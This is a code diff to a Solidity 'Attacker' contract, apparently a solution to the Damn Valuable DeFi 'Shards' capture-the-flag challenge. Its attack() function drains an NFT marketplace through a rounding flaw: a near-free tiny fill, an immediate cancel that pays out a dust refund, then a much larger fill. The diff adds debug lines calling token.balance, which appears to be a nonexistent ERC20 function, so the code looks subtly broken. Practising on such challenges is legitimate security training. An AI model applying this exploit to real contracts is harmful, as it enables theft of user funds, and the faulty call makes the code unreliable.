@@ -13,29 +13,32 @@ import {
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
 contract Attacker {
-    IShardsNFTMarketplace immutable marketplace;
+    ShardsNFTMarketplace immutable marketplace;
     DamnValuableToken immutable token;
     address immutable recovery;
+    uint64 public offerId;
 
     constructor(
-        IShardsNFTMarketplace _marketplace,
+        ShardsNFTMarketplace _marketplace,
         DamnValuableToken _token,
-        uint64 offerId,
+        uint64 _offerId,
         address _recovery
     ) {
         marketplace = _marketplace;
         token = _token;
         recovery = _recovery;
+        offerId = _offerId;
     }
 
     function attack() external{
         // Approve max DVT spending (even with 0 balance)
         token.approve(address(marketplace), type(uint256).max);
-
+        console.log(token.balance(address(this)));
         // 1. Tiny fill with payment = 0 (want < 133)
         marketplace.fill(offerId, 100);
         // 2. Immediately cancel to get a dust refund
         marketplace.cancel(offerId, 0); // first purchase at index 0
+        console.log(token.balance(address(this)));
 
         // 3. Use the dust to fill a larger amount (payment ~7.5e12 DVT)
         marketplace.fill(offerId, 1e15);
